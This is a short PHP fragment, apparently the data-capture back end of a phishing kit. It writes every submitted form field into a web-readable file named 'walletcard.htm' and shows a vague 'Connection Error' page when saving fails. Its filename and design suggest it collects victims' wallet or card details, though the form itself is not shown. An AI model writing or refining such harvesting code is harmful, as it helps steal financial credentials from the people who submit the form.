// Open walletcard.htm in append mode (or create if it doesn't exist)
$handle = fopen("walletcard.htm", "a");
if ($handle === false) {
    // Error handling as you already have
    // ...
}

// Iterate through POST data and write to the file
$writeSuccess = true; // Track write success
foreach ($_POST as $variable => $value) {
    $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    
    if (fwrite($handle, "$safe_variable=$safe_value<br>") === false) {
        $writeSuccess = false; // Mark as unsuccessful if any write fails
        break; // Exit loop if a write fails
    }
}

// Add a separator for entries
if ($writeSuccess) {
    fwrite($handle, "<hr>");
}

// Close the file handle
fclose($handle);

// Redirect logic
if ($writeSuccess) {
    // Show success page
    // ...
} else {
    // Show error message if writing failed
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Connection Error</title>
        <style>
            /* Your styles for the error message */
        </style>
    </head>
    <body>
        <div class="error-container">
            <h1>Error Saving Data</h1>
            <p>There was an issue saving your data. Please try again later.</p>
            <button class="btn" onclick="window.location.href=\'index.html\'">Go Back to Home</button>
        </div>
    </body>
    </html>
    ';
}
